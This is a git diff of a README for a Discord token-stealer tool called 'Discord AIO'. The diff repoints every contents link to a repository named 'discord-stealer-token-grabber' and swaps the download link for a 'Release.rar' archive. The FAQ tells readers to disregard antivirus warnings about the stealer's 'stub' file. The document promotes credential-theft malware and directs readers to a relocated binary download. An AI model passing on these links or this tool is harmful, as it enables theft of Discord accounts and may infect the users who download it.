@@ -21,15 +21,15 @@ I will not be held accountable for any illegal activities.
    
 ## Contents Page
      
-[Main features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#main-features)<br/>
-[Stealer features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#stealer-features)<br/>
-[Optional features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#optional-stealer-features)<br/>
-[Additional features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#additional)<br/>
-[Upcoming features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#coming-soon)<br/>  
-[Versions](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#versions)<br/>
-[FAQ](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#faq)<br/> 
-[Showcase](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#showcase)<br/>
-[Credits](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#credits)<br/>
+[Main features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#main-features)<br/>
+[Stealer features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#stealer-features)<br/>
+[Optional features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#optional-stealer-features)<br/>
+[Additional features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#additional)<br/>
+[Upcoming features](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#coming-soon)<br/>  
+[Versions](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#versions)<br/>
+[FAQ](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#faq)<br/> 
+[Showcase](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#showcase)<br/>
+[Credits](https://github.com/kromosohn/discord-stealer-token-grabber/blob/main/README.md#credits)<br/>
 
 ## Features of Discord AIO  
       
@@ -172,7 +172,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.3/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/kromosohn/discord-stealer-token-grabber/releases/download/Release/Release.rar).
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
